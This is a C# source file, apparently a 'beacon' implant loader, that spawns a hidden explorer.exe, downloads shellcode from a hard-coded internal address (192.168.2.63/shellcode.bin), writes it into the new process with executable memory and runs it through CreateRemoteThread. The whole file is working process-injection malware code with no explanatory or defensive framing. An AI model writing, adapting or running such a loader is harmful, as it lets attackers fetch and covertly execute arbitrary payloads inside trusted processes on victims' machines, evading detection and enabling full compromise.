using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BeaconCSharp
{
    internal class Program
    {
        public static async Task Main(string[] args)
        {
            // Create startup info struct
            Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(Win32.STARTUPINFO));
            startupInfo.dwFlags = 0x00000001;  // STARTF_USESHOWWINDOW

            // Create process info struct
            Win32.PROCESS_INFORMATION processInfo;

            // Command to execute
            string cmd = "explorer.exe";

            // Create process
            bool success = Win32.CreateProcessW(
                null,
                cmd,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                (uint)Win32.PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out processInfo
            );

            if (!success)
            {
                Console.WriteLine("Failed to create process.");
                return;
            }

            // Download shellcode
            byte[] shellcode;
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://192.168.2.63");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
            }

            // Allocate memory in the remote process
            IntPtr remoteBuffer = Win32.VirtualAllocEx(
                processInfo.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.MEM_ALLOCATION_TYPE.MEM_COMMIT,
                Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE
            );

            if (remoteBuffer == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate memory in the remote process.");
                Win32.CloseHandle(processInfo.hProcess);
                Win32.CloseHandle(processInfo.hThread);
                return;
            }

            // Write the shellcode into the allocated memory
            IntPtr bytesWritten;
            success = Win32.WriteProcessMemory(
                processInfo.hProcess,
                remoteBuffer,
                shellcode,
                (uint)shellcode.Length,
                out bytesWritten
            );

            if (!success || bytesWritten.ToInt32() != shellcode.Length)
            {
                Console.WriteLine("Failed to write shellcode into the remote process.");
                Win32.CloseHandle(processInfo.hProcess);
                Win32.CloseHandle(processInfo.hThread);
                return;
            }

            // Create a remote thread in the target process to execute the shellcode
            uint threadId;
            IntPtr hThread = Win32.CreateRemoteThread(
                processInfo.hProcess,
                IntPtr.Zero,
                0,
                remoteBuffer,
                IntPtr.Zero,
                0,
                out threadId
            );

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create remote thread.");
                Win32.CloseHandle(processInfo.hProcess);
                Win32.CloseHandle(processInfo.hThread);
                return;
            }

            // Close handles
            Win32.CloseHandle(hThread);
            Win32.CloseHandle(processInfo.hThread);
            Win32.CloseHandle(processInfo.hProcess);

            Console.WriteLine("Shellcode executed successfully.");
        }
    }
}

